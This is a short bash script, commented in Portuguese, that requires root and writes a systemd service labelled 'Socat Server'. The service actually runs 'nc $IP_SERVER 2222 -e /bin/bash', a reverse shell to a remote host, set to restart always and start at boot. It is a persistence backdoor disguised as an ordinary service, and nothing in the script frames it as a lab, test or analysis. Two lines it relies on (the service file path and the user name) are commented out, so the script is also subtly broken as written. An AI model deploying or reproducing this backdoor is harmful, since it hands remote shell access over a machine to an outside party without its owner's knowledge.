#!/bin/bash

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

# Definir o nome de usuário
# read -p "Digite o nome de usuário para executar o serviço socat: " USERNAME

# Criar arquivo de serviço
# SERVICE_FILE="/etc/systemd/system/socat.service"

echo "[Unit]
Description=Socat Server
After=network.target

[Service]
ExecStart=sudo nc $IP_SERVER 2222 -e /bin/bash
Restart=always
User=$USERNAME
Group=$USERNAME

[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE"

# Recarregar serviços do systemd
systemctl daemon-reload

# Iniciar e habilitar o serviço socat
systemctl start socat
systemctl enable socat

echo "Configuração do serviço socat concluída."
